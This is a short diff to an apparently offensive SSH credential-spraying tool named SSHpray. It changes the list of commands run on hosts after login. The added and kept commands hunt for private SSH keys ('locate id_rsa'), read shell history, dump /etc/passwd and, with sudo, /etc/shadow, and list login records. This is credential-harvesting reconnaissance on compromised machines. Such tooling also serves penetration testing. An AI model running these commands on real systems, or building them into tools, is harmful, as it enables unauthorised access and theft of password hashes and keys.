@@ -23,7 +23,7 @@ class SSHpray():
 		self.timeout = int(5)
 
 		#command(s) to run
-		self.remote_commands = ['cat ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','exit']
+		self.remote_commands = ['locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
 
 	def check_args(self, parser):
 
